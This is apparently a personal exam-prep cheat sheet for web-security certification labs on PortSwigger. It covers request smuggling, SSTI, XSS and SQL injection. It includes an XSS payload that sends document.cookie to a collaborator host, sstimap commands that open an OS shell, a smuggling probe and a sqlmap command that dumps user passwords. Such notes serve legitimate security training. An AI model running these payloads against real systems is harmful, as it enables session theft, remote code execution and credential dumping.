## Tips
### Keep in Mind
- [ ] Burp Scanner is the MOST POWERFUL WEAPON
- [ ] Run Smuggler on 1 App while testing on 2nd app
### If you STUCKED In the Exam
- [ ] HTTP Smuggle Full Scan
- [ ] Review JS & HTML
- [ ] Scan MAIN Page & Suspicious Points and pages
- [ ] Run Param Miner
- [ ] Test for Host Header Attacks MANUALLY
- [ ] Prototype Pollution Scanner **UP** [ Client & Server ]
- [ ] Run CL.0 Scan for every endpoint
- [ ] Run Content Discovery

### All Vulns
- SQL injection
- XSS
- CSRF
- Clickjacking
- DOM-based vulnerabilities
- CORS
- XXE
- SSRF
- smuggling
- OS command injection
- SSTI
- Path traversal
- Access control vulnerabilities
- Authentication
- WebSockets
- Web cache poisoning
- Insecure deserialization
- Information disclosure
- Business logic vulnerabilities
- Host header attacks
- OAuth authentication
- File upload
- JWT
- Prototype pollution
- GraphQL API vulnerabilities
- Race conditions
- NoSQL injection
### SQL Injection
- `SUBSTRING(string_expression, start_position, length)`
- Not all injections can be detected with ' or " or \` . Use Burp Scanner
  Lab: Blind [SQL injection](https://portswigger.net/web-security/sql-injection) with time delays: 
### XSS
- HTML Entities work fine inside events (converting character to html entity which reflected inside an event doesn't mean it is escaped)
- Fetch Function 
 ```fetch("https://BURP-COLLAB",{method:"POST",mode:"cors",body:document.cookie});```
### CSRF
- Setting the Cookie without SameSite restriction make the browser use Lax by default, and in this case the cookie could be sent in cross-site POST request in the first 120 seconds after setting the cookie.
  In this case you need to refresh(reset) the cookie before the exploit.
### SSTI
- Command for Detection & Exploitation
	```./sstimap.py -u https://www.example.net/?msg=test```
	-e : for selecting Template ex: ERB
	--os-shell : for opening an interactive shell
- Detect Command
	GET
		```./sstimap.py --url URL --method GET --cookie 'key=value' --header 'key: value' --level 5 --engine ENGINE --technique RT --os-shell  # RT:Rendered&Time-based```
	POST
		```./sstimap.py --url URL --method POST --data 'POST_BODY' --cookie 'key=value' --header 'key: value' --level 5 --engine ENGINE --technique RT --os-shell  # RT:Rendered&Time-based```

### Request Smuggling
- New lines After and Before the hex number of Chunked Transfer
	- Before
		- 0: 1 line (2 lines if it is in the body of the first request)
	 - After
		- 0: 2 lines
		- else: 1 
###### Identification: Burp Scanner vs HTTP Request Smuggling Extension
Note: Burp Scanner doesn't show if it is TE.CL or CL.TE
Lab ID is based on the sort of labs in the All Labs page on PortSwigger
Testing on 10 Oct 2023
Lab ID: is based on the sort of the labs in PortSwigger's All Labs page

| Lab ID | Scanner | Extension |
|--------|---------|-----------|
|1| ✅|✅(Smuggle Probe)|
|2| ✅|✅(Smuggle Probe)|
|3| ✅|✅(Smuggle Probe)|
|4| ✅|✅(Smuggle Probe)|
|5| ✅|✅(Smuggle Probe)|
|6| ✅|✅(Smuggle Probe)|
|7| ✅|✅(Smuggle Probe)|
|8| ❌|✅(HTTP/2 probe)|
|9| ❌|❌ (All Scans Response: H2.TE❌) - (Correct is H2.CL✅)|
|10| ❌|❌ (All Scans Response: H2.TE&Dual Path Support❌) - (Correct is H2 Injection via CRLF✅)|
|11| ❌|❌ (All Scans Response: Dual Path Support ONLY❌) - (Correct is H2 Req Splitting via CRLF✅)|
|12| ❌|✅**Needs testing on every endpoint** ⚠⚠|
|13| ✅|✅(Smuggle Probe)|
|14| ✅|✅(Smuggle Probe)|
|15| ✅|✅(Smuggle Probe)|

- TE.CL
	- Second Req must have those headers and with high content-length than what it have in the body
		```
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 15
		
		x=99
		```
- H2.TE
	- Validate the Vulnerability
	```
	POST / HTTP/2
	Host: 0a6e000e04b173f0855f2b9f009a00da.web-security-academy.net
	Transfer-Encoding: chunked
	Content-Length: 13
	
	0
	
	SMUGGLED
	```
- CL.0
	- High probability it will be on POST Requests by default like login and adding a comment.
	- ==**Needs testing on every endpoint** ⚠⚠==
	- [Great Explaination](https://sc.scomurr.com/http-request-smuggling-admin-access-via-cl-0-vulnerability/)



### Web Cache Poisoning
- [ ] Web Cache Poisoning with **unkeyed query** string is not detectable by Burp Scanner
- [ ] Cache keys can be known by sending this header
      ```Pragma: x-get-cache-key``` Respond with the keys that is sent only not all keys

### Prototype Pollution
- Constructer Payload is not tested by the extension
	`"constructor": { "prototype": { "json spaces":10 } }`
### 3 Stages Vulns
| Vulns-Stages | 1 | 2 | 3 |
|--------------|---|---|---|
|GraphQL|✅|✅|❌|
|Prototype Pollution|✅|✅|✅|

### Sqlmap
```
sqlmap -u "URRRRRL" -D public -T users -C password --batch --technique=B -p organize_by --cookie "COOOOOOOKIS" --dump
```
